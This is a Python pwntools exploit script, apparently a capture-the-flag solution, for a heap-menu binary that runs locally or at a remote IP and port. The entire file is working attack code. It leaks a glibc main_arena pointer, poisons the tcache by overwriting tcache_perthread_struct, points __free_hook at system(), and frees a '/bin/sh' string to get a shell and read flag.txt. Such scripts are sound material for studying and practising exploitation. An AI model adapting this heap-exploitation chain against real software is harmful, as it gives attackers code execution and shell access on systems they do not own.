#!/usr/bin/python3
from pwn import *

LOCAL = True
DEBUG = False

def binary_connect():
  if LOCAL:
    if DEBUG:
      p = gdb.debug('../a.out', '''
          continue
      ''')
    else:
      p = process('../a.out')
  else:
    p = remote('34.136.150.230', 49153)

  return p

def exploit(): 
  def allocate(len, input_str):
    p.send(b'1\n')
    p.recvuntil(b'> ')
    p.send(str(len).encode('utf-8') + b'\n')
    p.recvuntil(b'> ')
    p.send(input_str)
    p.recvuntil(b'> ')

  def delete():
    p.send(b'2\n')
    p.recvuntil(b'> ')

  def fav_string():
    p.send(b'3\n')
    resp = p.recvuntil(b'\n')
    try:
      ret = resp.split(b': ')
      ret = ret[1]
    except:
      ret = resp
    p.recvuntil(b'> ')
    return ret

  def fill_tcache(str): 
    for _ in range(0,7): 
      allocate(len(str), str)
    delete()  

  p = binary_connect()
  print(p.pid)
  p.recvuntil(b'> ')

  funnest_str = b"fun" + b'B' * 0x30
  allocate(len(funnest_str + b"\n"), funnest_str + b"\n")

  # fill 0x290 tcache 
  fill_tcache(b'A' * 0x280 + b"\n")

  # meet quota and automatically delete fun string list
  input_str =  b"fun" + b'A' * 0x20
  allocate(len(input_str + b"\n"),    input_str + b"\n")
  allocate(len(input_str + b"n\n"),   input_str + b"n\n")
  allocate(len(input_str + b"nn\n"),  input_str + b"nn\n")
  main_arena_leak = fav_string()[:-1]
  main_arena_leak = int.from_bytes(main_arena_leak, "little")
  print(hex(main_arena_leak))

  glibc_base_addr = main_arena_leak - 0x1c0a60
  system_addr = glibc_base_addr + 0x49de0
  malloc_hook_addr = main_arena_leak - 0x70
  free_hook_addr = malloc_hook_addr + 0x3290

  # overwrite tcache_perthread_struct to clear out current tcache and leave
  # fabricated entry in the 0x40 bin, with a pointer to above free_hook
  payload = b'\x00\x00' * 2 + b'\x01' 
  payload += b'\x00' * (0x80 - len(payload))
  payload += p64(0) + p64(0) + p64(free_hook_addr-0x20)
  payload += b'\x00' * (0x26f - len(payload)) + b'\n'
  allocate(len(payload), payload)

  # overwrite free_hook with the address of system 
  payload = b'\x00' * 0x20 + p64(system_addr) + b'\n'
  
  allocate(len(payload), payload)

  # allocate a new string that has "/bin/sh" in it and free it 
  payload = b'/bin/sh\x00'
  allocate(len(payload), payload)
  p.send(b'2\n')
  p.send(b'cat flag.txt\n')
  print(p.recv())

if __name__ == "__main__":
  context.log_level = "debug"
  exploit()